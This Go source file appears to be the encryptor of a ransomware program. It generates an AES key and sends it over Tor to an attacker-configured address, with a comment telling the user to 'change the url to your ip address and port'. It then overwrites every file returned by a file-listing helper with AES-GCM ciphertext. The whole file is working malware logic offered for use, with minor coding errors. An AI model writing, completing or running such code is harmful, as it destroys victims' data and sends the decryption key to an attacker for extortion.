package main

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fileutils"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"time"

	"github.com/cretz/bine/tor"
	"github.com/joho/godotenv"
)

// Encrypt main function
func main() {
	bytes := make([]byte, 32)
	if _, err := rand.Read(bytes); err != nil {
		panic(err.Error())
	}

	key := hex.EncodeToString(bytes)
	// We have to send the key to the server
	sendKeyToServer(key)

	for _, file := range fileutils.GetAllFiles() {
		plaintext, err := ioutil.ReadFile(file)
		if err != nil {
			panic(err.Error())
		}

		block, err := aes.NewCipher(bytes)
		if err != nil {
			panic(err.Error())
		}

		aesGCM, err := cipher.NewGCM(block)
		if err != nil {
			panic(err.Error())
		}

		nonce := make([]byte, aesGCM.NonceSize())
		if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
			panic(err.Error())
		}

		ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)

		err2 := ioutil.WriteFile(file, []byte(hex.EncodeToString(ciphertext)), 0644)

		if err2 != nil {
			panic(err.Error())
		}
	}

}

func sendKeyToServer(key string) error {
	t, err := tor.Start(context.TODO(), nil)
	if err != nil {
		return err
	}
	defer t.Close()
	// Wait at most a minute to start network and get
	dialCtx, dialCancel := context.WithTimeout(context.Background(), time.Minute)
	defer dialCancel()
	// Make connection
	dialer, err := t.Dialer(dialCtx, nil)
	if err != nil {
		return err
	}
	httpClient := &http.Client{Transport: &http.Transport{DialContext: dialer.DialContext}}

	// change the url to your ip address and port
	godotenv.Load("../.env")
	address := os.Getenv("ADDRESS")

	URL := "http://" + address

	resp, err := httpClient.PostForm(URL, url.Values{"key": {key}})

	if err != nil {
		panic(err.Error())
	}

	defer resp.Body.Close()

	return err
}
